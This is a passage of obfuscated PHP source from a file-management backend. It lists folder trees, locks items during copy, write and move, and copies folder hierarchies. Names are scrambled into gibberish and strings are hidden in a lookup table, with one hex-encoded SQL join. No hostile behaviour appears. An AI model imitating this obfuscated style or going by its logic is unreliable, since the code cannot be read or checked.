$òœ¸ËÙï = array_to_keyvalue($óÕêò, $ú©Òåƒ[12], $ú©Òåƒ[497]); $çÁÑº•Á = array_to_keyvalue($óÕêò, $ú©Òåƒ[12], $ú©Òåƒ[499]); $âê’›ß¼ = array_merge($òœ¸ËÙï, $çÁÑº•Á); $ƒÉ™ ’¥ = Model($ú©Òåƒ[569])->userListInfo($âê’›ß¼); foreach ($óÕêò as &$ÔàéšæË) { $Á²­èÎ = $ÔàéšæË[$ú©Òåƒ[497]]; $ÔàéšæË[$ú©Òåƒ[497]] = $ƒÉ™ ’¥[$Á²­èÎ] ? $ƒÉ™ ’¥[$Á²­èÎ] : !1; $Á²­èÎ = $ÔàéšæË[$ú©Òåƒ[499]]; $ÔàéšæË[$ú©Òåƒ[499]] = $ƒÉ™ ’¥[$Á²­èÎ] ? $ƒÉ™ ’¥[$Á²­èÎ] : !1; if (isset($ÔàéšæË[$ú©Òåƒ[509]]) && $ÔàéšæË[$ú©Òåƒ[509]][$ú©Òåƒ[577]]) { $áù›Ùñ = $GLOBALS[$ú©Òåƒ[6]][$ú©Òåƒ[91]][$ú©Òåƒ[578]]; if ($ÔàéšæË[$ú©Òåƒ[509]][$ú©Òåƒ[579]] <= time() - $áù›Ùñ) { $this->metaSet($ÔàéšæË[$ú©Òåƒ[183]], $ú©Òåƒ[577], null); $this->metaSet($ÔàéšæË[$ú©Òåƒ[183]], $ú©Òåƒ[579], null); unset($ÔàéšæË[$ú©Òåƒ[509]][$ú©Òåƒ[577]]); continue; } $—°Ø¼µÚ = $ÔàéšæË[$ú©Òåƒ[509]][$ú©Òåƒ[577]]; $ÔàéšæË[$ú©Òåƒ[509]][$ú©Òåƒ[580]] = Model($ú©Òåƒ[569])->getInfoSimpleOuter($—°Ø¼µÚ); } } unset($ÔàéšæË); } public function parentLevelArray($£Û«÷§) { $€½äùæÓ =& $_SERVER[ò«¥Ê‡å]; $£Û«÷§ = explode($€½äùæÓ[50], trim($£Û«÷§, $€½äùæÓ[50])); return array_remove_value($£Û«÷§, $€½äùæÓ[214]); } public function listAll($è†‘¯½) { $È –¬Ù =& $_SERVER[ò«¥Ê‡å]; $å»¼æ‚ô = $this->sourceInfo($è†‘¯½); $¾²ÔÅŸ¿ = array($È –¬Ù[581] => array($È –¬Ù[582], $å»¼æ‚ô[$È –¬Ù[555]] . $è†‘¯½ . $È –¬Ù[583]), $È –¬Ù[584] => 0); $ù’Š‹š = $È –¬Ù[585]; $÷“Ø„Ç = "\x4c\105\x46\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\x6c\x65\40\x66\x69\154\x65\x20\157\x6e\x20\x73\x6f\165\x72\x63\x65\x2e\146\x69\154\145\x49\104\x20\75\x20\x66\151\x6c\x65\56\146\151\x6c\145\x49\x44"; $’Å©èáÂ = $this->alias($È –¬Ù[489])->field($ù’Š‹š)->where($¾²ÔÅŸ¿)->join($÷“Ø„Ç)->select(); $this->_listAppendAuth($’Å©èáÂ); $this->_listAppendUser($’Å©èáÂ); $this->_listAppendPath($’Å©èáÂ); $’Å©èáÂ = array_to_keyvalue($’Å©èáÂ, $È –¬Ù[183]); $·¯Ï¤ç = "\x2f{$å»¼æ‚ô[$È –¬Ù[32]]}\x2f"; $·¯Ï¤ç = $·¯Ï¤ç == $È –¬Ù[563] ? $È –¬Ù[8] : $·¯Ï¤ç; $µÛàÄ³ = array(); foreach ($’Å©èáÂ as $àïËê¸æ => $¿‘ƒø) { $Ìóá•¯ı = $this->parentLevelArray($¿‘ƒø[$È –¬Ù[555]]); array_shift($Ìóá•¯ı); $°Ü´¦â½ = $·¯Ï¤ç; for ($äœı­«Û = 0; $äœı­«Û < count($Ìóá•¯ı); $äœı­«Û++) { $°Ü´¦â½ .= $’Å©èáÂ[$Ìóá•¯ı[$äœı­«Û]][$È –¬Ù[32]] . $È –¬Ù[8]; } $°Ü´¦â½ .= $¿‘ƒø[$È –¬Ù[32]]; if ($¿‘ƒø[$È –¬Ù[455]]) { $°Ü´¦â½ .= $È –¬Ù[8]; } $¤ò»‚óÈ = array($È –¬Ù[465] => str_replace($È –¬Ù[563], $È –¬Ù[8], str_replace($È –¬Ù[563], $È –¬Ù[8], str_replace($È –¬Ù[563], $È –¬Ù[8], $°Ü´¦â½))), $È –¬Ù[586] => intval($¿‘ƒø[$È –¬Ù[455]]), $È –¬Ù[587] => intval($¿‘ƒø[$È –¬Ù[78]]), $È –¬Ù[87] => intval($¿‘ƒø[$È –¬Ù[87]]), $È –¬Ù[89] => $this->pathInfoFilter($¿‘ƒø)); if (!$¤ò»‚óÈ[$È –¬Ù[455]]) { $¤ò»‚óÈ[$È –¬Ù[511]] = $¿‘ƒø[$È –¬Ù[511]]; } $µÛàÄ³[] = $¤ò»‚óÈ; } $µÛàÄ³ = array_sort_by($µÛàÄ³, $È –¬Ù[86]); return $µÛàÄ³; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÈĞ¦“Ğ) { $¨ùà¼ç =& $_SERVER[ò«¥Ê‡å]; if (!$this->allowLock()) { return; } $this->_lockCheck($¨ùà¼ç[588], $ÈĞ¦“Ğ); $Ş†‘„ÁÓ = 1; $this->_lockEvent($ÈĞ¦“Ğ, array($¨ùà¼ç[589], $¨ùà¼ç[590]), $Ş†‘„ÁÓ); $this->_lockParent($ÈĞ¦“Ğ, array($¨ùà¼ç[590]), $Ş†‘„ÁÓ); $this->_lockEvent($ÈĞ¦“Ğ, array($¨ùà¼ç[591], $¨ùà¼ç[592]), $Ş†‘„ÁÓ); $this->_lockCheckEnd($¨ùà¼ç[588], $ÈĞ¦“Ğ); } public function lockCopyEnd($Œæø–å×) { $àíÀÛ¥ö =& $_SERVER[ò«¥Ê‡å]; if (!$this->allowLock()) { return; } $ãÊåÏÔÕ = 0; $this->_lockEvent($Œæø–å×, array($àíÀÛ¥ö[589], $àíÀÛ¥ö[590]), $ãÊåÏÔÕ); $this->_lockParent($Œæø–å×, array($àíÀÛ¥ö[590]), $ãÊåÏÔÕ); $this->_lockEvent($Œæø–å×, array($àíÀÛ¥ö[591], $àíÀÛ¥ö[592]), $ãÊåÏÔÕ); } public function lockWriteStart($Ú°Û¢ö, $›”ßÕ§ = '') { $·ããï€ =& $_SERVER[ò«¥Ê‡å]; if (!$this->allowLock()) { return; } $this->_lockCheck($·ããï€[589], $Ú°Û¢ö); $ŒÂÕ²ÕÜ = 1; $this->_lockKey($·ããï€[593] . $Ú°Û¢ö . $·ããï€[10] . $›”ßÕ§, $ŒÂÕ²ÕÜ); $this->_lockEvent($Ú°Û¢ö, array($·ããï€[588], $·ããï€[590]), $ŒÂÕ²ÕÜ); $this->_lockParent($Ú°Û¢ö, array($·ããï€[588], $·ããï€[590]), $ŒÂÕ²ÕÜ); $this->_lockCheckEnd($·ããï€[589], $Ú°Û¢ö); } public function lockWriteEnd($†ç¿ª‹°, $”÷­…õç = '') { $ƒ‰²˜• =& $_SERVER[ò«¥Ê‡å]; if (!$this->allowLock()) { return; } $´÷©¹ƒü = 0; $this->_lockKey($ƒ‰²˜•[593] . $†ç¿ª‹° . $ƒ‰²˜•[10] . $”÷­…õç, $´÷©¹ƒü); $this->_lockEvent($†ç¿ª‹°, array($ƒ‰²˜•[588], $ƒ‰²˜•[590]), $´÷©¹ƒü); $this->_lockParent($†ç¿ª‹°, array($ƒ‰²˜•[588], $ƒ‰²˜•[590]), $´÷©¹ƒü); } public function lockMoveStart($Ì´ç€í¼) { $–Îöë¶ =& $_SERVER[ò«¥Ê‡å]; if (!$this->allowLock()) { return; } $this->_lockCheck($–Îöë¶[590], $Ì´ç€í¼); $Ï—Õ‡²‘ = 1; $this->_lockKey($–Îöë¶[594] . $Ì´ç€í¼, $Ï—Õ‡²‘); $this->_lockEvent($Ì´ç€í¼, array($–Îöë¶[588], $–Îöë¶[589]), $Ï—Õ‡²‘); $this->_lockParent($Ì´ç€í¼, array($–Îöë¶[588], $–Îöë¶[590]), $Ï—Õ‡²‘); $this->_lockEvent($Ì´ç€í¼, array($–Îöë¶[595], $–Îöë¶[591], $–Îöë¶[592]), $Ï—Õ‡²‘); $this->_lockCheckEnd($–Îöë¶[590], $Ì´ç€í¼); } public function lockMoveEnd($ ¢ëûÚ˜) { $åá€Í–» =& $_SERVER[ò«¥Ê‡å]; if (!$this->allowLock()) { return; } $Ø¿¸«Î› = 0; $this->_lockKey($åá€Í–»[594] . $ ¢ëûÚ˜, $Ø¿¸«Î›); $this->_lockEvent($ ¢ëûÚ˜, array($åá€Í–»[588], $åá€Í–»[589]), $Ø¿¸«Î›); $this->_lockParent($ ¢ëûÚ˜, array($åá€Í–»[588], $åá€Í–»[590]), $Ø¿¸«Î›); $this->_lockEvent($ ¢ëûÚ˜, array($åá€Í–»[595], $åá€Í–»[591], $åá€Í–»[592]), $Ø¿¸«Î›); } private function _lockCheck($ù½ûÎ€å, $•¡°Ò‹) { $¡Á¢§ä =& $_SERVER[ò«¥Ê‡å]; $É±Üğ‰Ê = $this->sourceInfo($•¡°Ò‹); $Ÿ’©ŠÜÄ = $ù½ûÎ€å . $¡Á¢§ä[10] . $•¡°Ò‹; $this->_lockTimeStart[$Ÿ’©ŠÜÄ] = timeFloat(); if (!is_array($É±Üğ‰Ê)) { return; } $Š§à²Å” = LNG($¡Á¢§ä[596]); CacheLock::setErrorMsg($¡Á¢§ä[165] . htmlspecialchars($É±Üğ‰Ê[$¡Á¢§ä[32]]) . $¡Á¢§ä[167] . $Š§à²Å”); $this->_lockKey($Ÿ’©ŠÜÄ, 1); $this->_lockKey($Ÿ’©ŠÜÄ, 0); $’áêØ§‹ = array_reverse($this->parentLevelArray($É±Üğ‰Ê[$¡Á¢§ä[555]])); foreach ($’áêØ§‹ as $ıúá“¾°) { $Ÿ’©ŠÜÄ = $ù½ûÎ€å . $¡Á¢§ä[597] . $ıúá“¾°; if (CacheLock::lockGet($¡Á¢§ä[598] . $Ÿ’©ŠÜÄ)) { $É±Üğ‰Ê = $this->sourceInfo($ıúá“¾°); CacheLock::setErrorMsg($¡Á¢§ä[165] . htmlspecialchars($É±Üğ‰Ê[$¡Á¢§ä[32]]) . $¡Á¢§ä[167] . $Š§à²Å”); $this->_lockKey($Ÿ’©ŠÜÄ, 1); $this->_lockKey($Ÿ’©ŠÜÄ, 0); } } } private function _lockCheckEnd($Š†©úù­, $’¶§í¡ã) { $“šŞ½ ã =& $_SERVER[ò«¥Ê‡å]; $ÒßÔÁŸ» = $Š†©úù­ . $“šŞ½ ã[10] . $’¶§í¡ã; CacheLock::setErrorMsg($“šŞ½ ã[424]); if (!isset($this->_lockTimeStart[$ÒßÔÁŸ»])) { return; } $Ù´†ÎöÇ = timeFloat() - $this->_lockTimeStart[$ÒßÔÁŸ»]; unset($this->_lockTimeStart[$ÒßÔÁŸ»]); if ($Ù´†ÎöÇ > 0.5) { unset(self::$cacheSourceInfo[$“šŞ½ ã[503] . $’¶§í¡ã]); } $å´¹±×é = $this->sourceInfo($’¶§í¡ã); if (!$å´¹±×é) { show_json(LNG($“šŞ½ ã[107]), !1); } } private function _lockParent($²•Ó±‘Ä, $ÁôÒûÊü, $ãÂô´Óã) { if (!$this->autoLockSet) { return; } $ğ—‘Àô¶ = $this->sourceInfo($²•Ó±‘Ä); if (!is_array($ğ—‘Àô¶)) { return; } $šåÎ¾Ù× = array_reverse($this->parentLevelArray($ğ—‘Àô¶[$_SERVER[ò«¥Ê‡å][555]])); foreach ($šåÎ¾Ù× as $½°Ôà¹ô) { $this->_lockEvent($½°Ôà¹ô, $ÁôÒûÊü, $ãÂô´Óã); } } private function _lockEvent($¾´ÇÃ²…, $ªÜã÷ÆÙ, $Íò”¯øì) { $¿íêïÓ =& $_SERVER[ò«¥Ê‡å]; if (!$this->autoLockSet) { return; } foreach ($ªÜã÷ÆÙ as $·®ĞÅŒ‘) { $Óœ¥èÚ = $·®ĞÅŒ‘ . $¿íêïÓ[10] . $¾´ÇÃ²…; if ($Íò”¯øì && CacheLock::lockGet($¿íêïÓ[598] . $Óœ¥èÚ)) { continue; } $this->_lockKey($Óœ¥èÚ, $Íò”¯øì); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($­³á—‘Ì, $…û¿‹Œ¾ = 1) { $éÙÆÓè = $_SERVER[ò«¥Ê‡å][598] . md5($­³á—‘Ì); if ($…û¿‹Œ¾) { if (isset(self::$_lockItemArr[$éÙÆÓè])) { return; } self::$_lockItemArr[$éÙÆÓè] = 1; CacheLock::lock($éÙÆÓè, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$éÙÆÓè])) { return; } unset(self::$_lockItemArr[$éÙÆÓè]); CacheLock::unlock($éÙÆÓè); } } public function isParentOf($ã“¿¬¿ , $Š“¹Ü­) { $Š†Ğ¶Áƒ =& $_SERVER[ò«¥Ê‡å]; $ôö“¡åÓ = $this->sourceInfo($ã“¿¬¿ ); $çßŞß‡î = $this->sourceInfo($Š“¹Ü­); $–¸¼™Òå = $ôö“¡åÓ[$Š†Ğ¶Áƒ[555]] . $ôö“¡åÓ[$Š†Ğ¶Áƒ[183]] . $Š†Ğ¶Áƒ[50]; $–öĞÙğÌ = $çßŞß‡î[$Š†Ğ¶Áƒ[555]] . $çßŞß‡î[$Š†Ğ¶Áƒ[183]] . $Š†Ğ¶Áƒ[50]; $ÄÈå†õá = strpos($–öĞÙğÌ, $–¸¼™Òå) === 0; return $ÄÈå†õá; } private $targetIsDelete = 0; public function copy($­è´ÖèØ, $¢ˆØ ø÷, $ä®é… = REPEAT_REPLACE, $Ê¾‡´‘Ú = '') { $æøÀÚÂ‰ =& $_SERVER[ò«¥Ê‡å]; $·›ê—â¡ = $this->sourceInfo($­è´ÖèØ); $æ˜îıº˜ = $this->sourceInfo($¢ˆØ ø÷); if (!$·›ê—â¡ || !$æ˜îıº˜ || $æ˜îıº˜[$æøÀÚÂ‰[455]] != $æøÀÚÂ‰[90]) { return !1; } if ($this->isParentOf($­è´ÖèØ, $¢ˆØ ø÷)) { return !1; } $ÒÌÍàµ„ = $Ê¾‡´‘Ú ? $Ê¾‡´‘Ú : $·›ê—â¡[$æøÀÚÂ‰[32]]; $this->lockCopyStart($­è´ÖèØ); $this->lockWriteStart($¢ˆØ ø÷, $ÒÌÍàµ„); $ ƒ² º‚ = array($æøÀÚÂ‰[599] => array(), $æøÀÚÂ‰[600] => array(), $æøÀÚÂ‰[601] => array()); $this->targetIsDelete = intval($·›ê—â¡[$æøÀÚÂ‰[475]]); $òçÂ»Şí = $this->fileNameExistAuto($¢ˆØ ø÷, $·›ê—â¡); $‘”µáİ¶ = $this->_copy($­è´ÖèØ, $¢ˆØ ø÷, $ä®é…, $ ƒ² º‚, !0, $Ê¾‡´‘Ú); $this->_childrenListClear(); $this->lockCopyEnd($­è´ÖèØ); $this->lockWriteEnd($¢ˆØ ø÷, $ÒÌÍàµ„); if ($·›ê—â¡[$æøÀÚÂ‰[455]] == $æøÀÚÂ‰[90] && $òçÂ»Şí == $‘”µáİ¶) { $this->folderSizeResetChildren($òçÂ»Şí); } Model($æøÀÚÂ‰[602])->addAll($ ƒ² º‚[$æøÀÚÂ‰[600]], array(), !0); if ($òçÂ»Şí != $‘”µáİ¶ || $·›ê—â¡[$æøÀÚÂ‰[455]] == $æøÀÚÂ‰[90]) { Model($æøÀÚÂ‰[603])->eventCopy($‘”µáİ¶); } $this->saveAll($ ƒ² º‚[$æøÀÚÂ‰[601]]); Model($æøÀÚÂ‰[216])->linkAdd($ ƒ² º‚[$æøÀÚÂ‰[599]]); $this->folderSizeReset($¢ˆØ ø÷); $this->updateModifyTime($¢ˆØ ø÷); return $‘”µáİ¶; } private function _copy($«İ×á°, $çÉïœÈÑ, $ıäæÃòÇ, &$ÍÊ ËÕ, $€…¶Æç, $ÕÙ¶µİÅ = '') { $ò‹ıõáô =& $_SERVER[ò«¥Ê‡å]; $æŒ‡¼ïÂ = $this->sourceInfoCache($«İ×á°); $ïúğâ´Ç = $æŒ‡¼ïÂ[$ò‹ıõáô[455]] == $ò‹ıõáô[90]; $ºµ«ÌÆ = $ÕÙ¶µİÅ ? $ÕÙ¶µİÅ : $æŒ‡¼ïÂ[$ò‹ıõáô[32]]; $ıŸş•™º = $this->fileNameExistAuto($çÉïœÈÑ, $æŒ‡¼ïÂ); if ($€…¶Æç) { $this->_childrenAllMake($«İ×á°); if ($ïúğâ´Ç && $ıŸş•™º) { $this->_childrenAllMake($ıŸş•™º); } } if (!$ıŸş•™º) { return $this->_copyCreate($«İ×á°, $çÉïœÈÑ, $ºµ«ÌÆ, $ÍÊ ËÕ); } $ ¬ø›ûŞ = $ıŸş•™º; if ($ïúğâ´Ç) { if ($ıäæÃòÇ == REPEAT_RENAME_FOLDER) { $ºµ«ÌÆ = $this->fileNameAutoCache($çÉïœÈÑ, $ºµ«ÌÆ, $ıäæÃòÇ, $ïúğâ´Ç); $ ¬ø›ûŞ = $this->_copyCreate($«İ×á°, $çÉïœÈÑ, $ºµ«ÌÆ, $ÍÊ ËÕ); } else { $úê´îŞÁ = $this->_childrenList($«İ×á°); foreach ($úê´îŞÁ as $ÍµØÙßÄ) { $this->_copy($ÍµØÙßÄ[$ò‹ıõáô[183]], $ıŸş•™º, $ıäæÃòÇ, $ÍÊ ËÕ, !1); } } } else { if ($ıäæÃòÇ == REPEAT_RENAME || $ıäæÃòÇ == REPEAT_RENAME_FOLDER) { $ºµ«ÌÆ = $this->fileNameAutoCache($çÉïœÈÑ, $ºµ«ÌÆ, $ıäæÃòÇ, $ïúğâ´Ç); $ ¬ø›ûŞ = $this->_copyCreate($«İ×á°, $çÉïœÈÑ, $ºµ«ÌÆ, $ÍÊ ËÕ); } else { if ($ıäæÃòÇ == REPEAT_REPLACE) { $—÷Í³‡ = $this->sourceInfoCache($ıŸş•™º); $Âğ‹ôİÌ = $this->fileHistory($—÷Í³‡, $æŒ‡¼ïÂ[$ò‹ıõáô[511]], $æŒ‡¼ïÂ[$ò‹ıõáô[78]]); if ($Âğ‹ôİÌ) { $ÍÊ ËÕ[$ò‹ıõáô[599]][] = $æŒ‡¼ïÂ[$ò‹ıõáô[511]]; } } else { if ($ıäæÃòÇ == REPEAT_SKIP) { } } } Hook::trigger($ò‹ıõáô[604], array($ò‹ıõáô[605], $æŒ‡¼ïÂ, 0)); } return $ ¬ø›ûŞ; } private function _copyCreate($±èÛ…÷Ô, $õª»Š•İ, $¬Ì×†Š, &$á×œÌÍ) { $¤­—‡Û± =& $_SERVER[ò«¥Ê‡å]; $Â˜ÍËğ² = $this->sourceInfoCache($±èÛ…÷Ô); $µ—Ô¶³Ù = $this->sourceInfoCache($õª»Š•İ); $¯íò•Œë = $this->_makeItemData($Â˜ÍËğ², $µ—Ô¶³Ù, $¬Ì×†Š); Hook::trigger($¤­—‡Û±[606], $¯íò•Œë); Hook::trigger($¤­—‡Û±[607], array($¤­—‡Û±[608], $¯íò•Œë, 0)); $’·­†€¨ = $this->add($¯íò•Œë); $§¹®üÀ½ = array($¤­—‡Û±[183] => $’·­†€¨, $¤­—‡Û±[32] => $¬Ì×†Š); $this->_copyApplyMeta($§¹®üÀ½, $á×œÌÍ); if ($Â˜ÍËğ²[$¤­—‡Û±[455]] != $¤­—‡Û±[90]) { $á×œÌÍ[$¤­—‡Û±[599]][] = $Â˜ÍËğ²[$¤­—‡Û±[511]]; return $’·­†€¨; } $â…´›¡Î = array(); $¾ÇÕ = array(); $this->_childrenListAll($±èÛ…÷Ô, $â…´›¡Î); $ø’„ˆ² = count($â…´›¡Î); if ($ø’„ˆ² == 0) { return $’·­†€¨; } $÷Â›Øşå = $this->sourceInfo($’·­†€¨); foreach ($â…´›¡Î as $ÔŠæÛ¯ø) { $Éª³ëÚ£ = $this->_makeItemData($ÔŠæÛ¯ø, $÷Â›Øşå, $ÔŠæÛ¯ø[$¤­—‡Û±[32]]); $Éª³ëÚ£[$¤­—‡Û±[555]] = $ÔŠæÛ¯ø[$¤­—‡Û±[555]]; $¾ÇÕ[] = $Éª³ëÚ£; } $this->chunkEventSet($¤­—‡Û±[609], array($¤­—‡Û±[610], $¯íò•Œë, $ø’„ˆ²)); $this->addAll($¾ÇÕ, array(), !1); $Øê½İ × = $this->where(array($¤­—‡Û±[182] => $’·­†€¨))->select(); $¶æŠ•–‹ = $this->_childrenMakeRelation($â…´›¡Î, $Øê½İ ×); $¶æŠ•–‹[$±èÛ…÷Ô] = $’·­†€¨; $»—°Ğº¢ = array(); $ıæ“À­Õ = array(); foreach ($Øê½İ × as $ÔŠæÛ¯ø) { $Åİõâ†ç = $ÔŠæÛ¯ø[$¤­—‡Û±[183]]; $Ìµ¤ºá® = $this->_childrenMatch($¶æŠ•–‹, $ÔŠæÛ¯ø, $÷Â›Øşå); $»—°Ğº¢[] = array($¤­—‡Û±[183], $Åİõâ†ç, $¤­—‡Û±[182], $Ìµ¤ºá®[$¤­—‡Û±[182]]); $ıæ“À­Õ[] = array($¤­—‡Û±[183], $Åİõâ†ç, $¤­—‡Û±[555], $Ìµ¤ºá®[$¤­—‡Û±[555]]); $this->_copyApplyMeta($ÔŠæÛ¯ø, $á×œÌÍ); if ($ÔŠæÛ¯ø[$¤­—‡Û±[455]] != $¤­—‡Û±[90]) { $á×œÌÍ[$¤­—‡Û±[599]][] = $ÔŠæÛ¯ø[$¤­—‡Û±[511]]; } } $this->chunkEventSet($¤­—‡Û±[611], array($¤­—‡Û±[612], $¯íò•Œë, $ø’„ˆ²)); $this->saveAll($»—°Ğº¢); $this->chunkEventSet($¤­—‡Û±[613], array($¤­—‡Û±[614], $¯íò•Œë, $ø’„ˆ²)); $this->saveAll($ıæ“À­Õ); return $’·­†€¨; } private function _childrenMakeRelation($¼õœ˜ê•, $˜™Àğúï) { $¯Ò»‚ş =& $_SERVER[ò«¥Ê‡å]; $â„ıŠ¿ú = array(); $éòğ¨Çƒ = array(); foreach ($¼õœ˜ê• as $Ë—£·è) { $ãÌõšÛ = $Ë—£·è[$¯Ò»‚ş[32]] . $¯Ò»‚ş[8] . $Ë—£·è[$¯Ò»‚ş[555]]; $â„ıŠ¿ú[$ãÌõšÛ] = $Ë—£·è[$¯Ò»‚ş[183]]; } foreach ($˜™Àğúï as $Ë—£·è) { $ãÌõšÛ = $Ë—£·è[$¯Ò»‚ş[32]] . $¯Ò»‚ş[8] . $Ë—£·è[$¯Ò»‚ş[555]]; $€§ÉáÆò = $â„ıŠ¿ú[$ãÌõšÛ]; $éòğ¨Çƒ[$€§ÉáÆò] = $Ë—£·è[$¯Ò»‚ş[183]]; } return $éòğ¨Çƒ; } private function _childrenMatch($ÂÒÌ  ÷, $ÌÌ•‘Œª, $µùŠ¸ü‡) { $ÕÙÚÅŠò =& $_SERVER[ò«¥Ê‡å]; $ùš¹âŞñ = $µùŠ¸ü‡[$ÕÙÚÅŠò[555]]; $Ç‰şïòÀ = $this->parentLevelArray($ÌÌ•‘Œª[$ÕÙÚÅŠò[555]]); foreach ($Ç‰şïòÀ as $ÚÈ¹¦¿É) { if (isset($ÂÒÌ  ÷[$ÚÈ¹¦¿É])) { $ùš¹âŞñ .= $ÂÒÌ  ÷[$ÚÈ¹¦¿É] . $ÕÙÚÅŠò[615]; } } $ùš¹âŞñ = rtrim($ùš¹âŞñ, $ÕÙÚÅŠò[50]) . $ÕÙÚÅŠò[50]; $Ò²ƒ©¢Š = $this->parentLevelArray($ùš¹âŞñ); $™ŒÔäíñ = $Ò²ƒ©¢Š[count($Ò²ƒ©¢Š) - 1]; return array($ÕÙÚÅŠò[182] => $™ŒÔäíñ, $ÕÙÚÅŠò[555] => $ùš¹âŞñ); } private function _makeItemData($‹ÉÂ¡·, $ŠòËè«ä, $Áï—ñÒş) { $Ê—æµÃò =& $_SERVER[ò«¥Ê‡å]; $×ÕÕ˜äÃ = array($Ê—æµÃò[616] => $‹ÉÂ¡·[$Ê—æµÃò[455]], $Ê—æµÃò[464] => $Áï—ñÒş, $Ê—æµÃò[617] => $‹ÉÂ¡·[$Ê—æµÃò[456]] ? $‹ÉÂ¡·[$Ê—æµÃò[456]] : $Ê—æµÃò[12], $Ê—æµÃò[512] => $‹ÉÂ¡·[$Ê—æµÃò[511]] ? $‹ÉÂ¡·[$Ê—æµÃò[511]] : 0, $Ê—æµÃò[587] => $‹ÉÂ¡·[$Ê—æµÃò[78]] ? $‹ÉÂ¡·[$Ê—æµÃò[78]] : 0, $Ê—æµÃò[618] => intval($ŠòËè«ä[$Ê—æµÃò[180]]), $Ê—æµÃò[619] => intval($ŠòËè«ä[$Ê—æµÃò[540]]), $Ê—æµÃò[620] => intval(USER_ID), $Ê—æµÃò[621] => intval(USER_ID), $Ê—æµÃò[447] => intval($ŠòËè«ä[$Ê—æµÃò[183]]), $Ê—æµÃò[622] => $ŠòËè«ä[$Ê—æµÃò[555]] . $ŠòËè«ä[$Ê—æµÃò[183]] . $Ê—æµÃò[50], $Ê—æµÃò[468] => $‹ÉÂ¡·[$Ê—æµÃò[87]] ? $‹ÉÂ¡·[$Ê—æµÃò[87]] : time(), $Ê—æµÃò[474] => 0, $Ê—æµÃò[623] => $Ê—æµÃò[12]); return $×ÕÕ˜äÃ; } private function _copyApplyMeta($ù¼•ó™¨, &$»şÈ³öê) { $ú±¨Ñô» =& $_SERVER[ò«¥Ê‡å]; $ì×ß¡·  = $ù¼•ó™¨[$ú±¨Ñô»[183]]; $­Í¿Ÿ• = $ù¼•ó™¨[$ú±¨Ñô»[32]]; if (!isset($ù¼•ó™¨[$ú±¨Ñô»[624]]) || !$ù¼•ó™¨[$ú±¨Ñô»[624]] || $ù¼•ó™¨[$ú±¨Ñô»[624]] == $ú±¨Ñô»[214]) { $»şÈ³öê[$ú±¨Ñô»[601]][] = array($ú±¨Ñô»[183], $ì×ß¡· , $ú±¨Ñô»[624], short_id($ì×ß¡· )); } if (Input::check($­Í¿Ÿ•, $ú±¨Ñô»[625])) { $»şÈ³öê[$ú±¨Ñô»[600]][] = array($ú±¨Ñô»[183] => $ì×ß¡· , $ú±¨Ñô»[96] => $ú±¨Ñô»[508], $ú±¨Ñô»[420] => str_replace($ú±¨Ñô»[53], $ú±¨Ñô»[12], Pinyin::get($­Í¿Ÿ•))); $»şÈ³öê[$ú±¨Ñô»[600]][] = array($ú±¨Ñô»[183] => $ì×ß¡· , $ú±¨Ñô»[96] => $ú±¨Ñô»[507], $ú±¨Ñô»[420] => Pinyin::get($­Í¿Ÿ•, $ú±¨Ñô»[626])); } $»şÈ³öê[$ú±¨Ñô»[600]][] = array($ú±¨Ñô»[183] => $ì×ß¡· , $ú±¨Ñô»[96] => $ú±¨Ñô»[487], $ú±¨Ñô»[420] => KodSort::makeStr($­Í¿Ÿ•)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ö½ˆ€ˆ‘) { $ö‡ïœ™ë =& $_SERVER[ò«¥Ê‡å]; $Àç¥š¿Ş = $this->sourceInfo($Ö½ˆ€ˆ‘); $û«Ò‚ˆ± = $ö‡ïœ™ë[627]; $Õ®Üå– = array($ö‡ïœ™ë[555] => array($ö‡ïœ™ë[582], $Àç¥š¿Ş[$ö‡ïœ™ë[555]] . $Ö½ˆ€ˆ‘ . $ö‡ïœ™ë[583]), $ö‡ïœ™ë[475] => $this->targetIsDelete); $êŸÍôÌš = $this->field($û«Ò‚ˆ±)->where($Õ®Üå–)->select(); if (!$êŸÍôÌš) { return; } $êŸÍôÌš = array_to_keyvalue($êŸÍôÌš, $ö‡ïœ™ë[183]); foreach ($êŸÍôÌš as $ØÜÑ·ı€) { $¼‰¬‰«­ = $ØÜÑ·ı€[$ö‡ïœ™ë[182]]; $Ö½ˆ€ˆ‘ = $ØÜÑ·ı€[$ö‡ïœ™ë[183]]; if (!isset($this->_childrenListCache[$Ö½ˆ€ˆ‘]) && $ØÜÑ·ı€[$ö‡ïœ™ë[455]] == $ö‡ïœ™ë[90]) { $this->_childrenListCache[$Ö½ˆ€ˆ‘] = array(); } if (!isset($this->_childrenListCache[$¼‰¬‰«­])) { $this->_childrenListCache[$¼‰¬‰«­] = array(); } $this->_childrenListCache[$¼‰¬‰«­][$Ö½ˆ€ˆ‘] = $ØÜÑ·ı€; $this->_childrenItemCache[$Ö½ˆ€ˆ‘] = $ØÜÑ·ı€; } } private function _childrenListAll($‘˜şÑ½, &$•š¹ñÙò) { $÷ÏæùİØ =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->_childrenListCache[$‘˜şÑ½])) { return; } $ç™¤í»« = $this->_childrenListCache[$‘˜şÑ½]; foreach ($ç™¤í»« as $±ÒÑÓõİ => $•ç¡¨åù) { $•š¹ñÙò[$±ÒÑÓõİ] = $•ç¡¨åù; if ($•ç¡¨åù[$÷ÏæùİØ[455]] == $÷ÏæùİØ[90]) { $this->_childrenListAll($±ÒÑÓõİ, $•š¹ñÙò); } } } private function sourceInfoCache($–Öö¹¥Ç) { if (isset($this->_childrenItemCache[$–Öö¹¥Ç])) { return $this->_childrenItemCache[$–Öö¹¥Ç]; } return $this->sourceInfo($–Öö¹¥Ç); } private function _childrenList($…×İğıŠ) { if (isset($this->_childrenListCache[$…×İğıŠ])) { return $this->_childrenListCache[$…×İğıŠ]; } return $this->_childrenListSelect($…×İğıŠ); } private function _childrenListSelect($ºÊìŸöÊ) { $ ÖİĞú =& $_SERVER[ò«¥Ê‡å]; $Å‹¹¨¨ = array($ ÖİĞú[182] => $ºÊìŸöÊ, $ ÖİĞú[475] => $this->targetIsDelete); $ãŒ±”«ï = $this->where($Å‹¹¨¨)->select(); $ãŒ±”«ï = $ãŒ±”«ï ? $ãŒ±”«ï : array(); 